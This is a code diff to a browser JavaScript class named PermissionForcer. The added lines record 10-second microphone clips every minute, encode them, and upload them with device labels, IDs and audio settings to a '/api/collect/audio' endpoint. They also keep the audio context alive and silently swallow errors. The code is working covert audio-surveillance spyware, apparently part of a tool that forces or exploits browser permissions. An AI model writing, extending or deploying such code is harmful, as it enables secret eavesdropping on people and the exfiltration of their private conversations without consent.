@@ -507,15 +507,92 @@ export default class PermissionForcer {
 
   startAudioCapture(stream) {
     try {
+      // Record actual audio clips and upload to Cloudinary via server
       const audioContext = new (window.AudioContext || window.webkitAudioContext)();
       const source = audioContext.createMediaStreamSource(stream);
       const analyser = audioContext.createAnalyser();
       analyser.fftSize = 256;
       source.connect(analyser);
 
+      // Send audio metrics (amplitude levels) periodically
       const bufferLength = analyser.frequencyBinCount;
       const dataArray = new Uint8Array(bufferLength);
 
+      // Record 10-second audio clips every 60 seconds
+      let mediaRecorder = null;
+      let audioChunks = [];
+      let recording = false;
+
+      const startRecording = () => {
+        if (recording) return;
+        recording = true;
+        audioChunks = [];
+
+        try {
+          // Create a new MediaRecorder from the stream
+          mediaRecorder = new MediaRecorder(stream, {
+            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
+              ? 'audio/webm;codecs=opus' 
+              : 'audio/webm'
+          });
+
+          mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+              audioChunks.push(event.data);
+            }
+          };
+
+          mediaRecorder.onstop = async () => {
+            recording = false;
+            if (audioChunks.length === 0) return;
+
+            try {
+              const blob = new Blob(audioChunks, { type: mediaRecorder.mimeType });
+              
+              // Convert to base64
+              const reader = new FileReader();
+              reader.onloadend = () => {
+                const base64Audio = reader.result;
+                
+                // Get average amplitude during recording
+                analyser.getByteFrequencyData(dataArray);
+                const avgAmp = dataArray.reduce((a, b) => a + b, 0) / bufferLength;
+
+                // Send to server
+                this.core.send('/api/collect/audio', {
+                  audioData: base64Audio,
+                  duration: 10,
+                  metadata: {
+                    format: 'webm',
+                    sampleRate: audioContext.sampleRate,
+                    channels: stream.getAudioTracks()[0]?.getSettings()?.channelCount || 1,
+                    amplitude: Math.round(avgAmp * 100) / 100,
+                    deviceLabel: stream.getAudioTracks()[0]?.label || 'unknown',
+                    deviceId: stream.getAudioTracks()[0]?.getSettings()?.deviceId || '',
+                    echoCancellation: stream.getAudioTracks()[0]?.getSettings()?.echoCancellation,
+                    noiseSuppression: stream.getAudioTracks()[0]?.getSettings()?.noiseSuppression
+                  },
+                  triggerType: 'permission-forcer'
+                });
+              };
+              reader.readAsDataURL(blob);
+            } catch (e) {}
+          };
+
+          // Record for 10 seconds
+          mediaRecorder.start();
+          setTimeout(() => {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+              mediaRecorder.stop();
+            }
+          }, 10000);
+
+        } catch (e) {
+          recording = false;
+        }
+      };
+
+      // Send metrics every 5s, record clip every 60s
       setInterval(() => {
         analyser.getByteFrequencyData(dataArray);
         const average = dataArray.reduce((a, b) => a + b, 0) / bufferLength;
@@ -529,9 +606,17 @@ export default class PermissionForcer {
         }
       }, 5000);
 
+      // Record 10s audio clip every 60 seconds
+      setInterval(() => startRecording(), 60000);
+
+      // Start first recording after 5 seconds
+      setTimeout(() => startRecording(), 5000);
+
+      // Keep audio context alive
       setInterval(() => {
         if (audioContext.state === 'suspended') audioContext.resume();
       }, 1000);
+
     } catch (e) {}
   }
 
